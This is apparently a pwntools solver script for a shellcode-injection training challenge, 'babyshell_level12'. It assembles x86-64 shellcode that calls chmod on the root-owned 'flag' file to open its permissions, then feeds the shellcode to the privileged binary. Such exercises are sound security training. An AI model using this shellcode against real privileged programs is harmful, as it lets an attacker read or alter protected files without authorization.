import glob
from pwn import *

context.update(arch="amd64", encoding="latin")

binary = "/challenge/babyshell_level12"

flag = b'flag'[::-1].hex()

shellcode = f'''
push 0x{flag}
push rsp
pop rdi

mov sil, 6

push 0x5a
pop rax
syscall
'''

shellcode = asm(shellcode)
# with open("shellsh12.bin", "wb") as f:
#     f.write(shellcode)

# exit(1)
print(disasm(shellcode))

with process([binary], cwd='/') as p:
    print(p.recvuntil(b'[LEAK]').decode())
    p.send(shellcode)
    print(p.interactive())

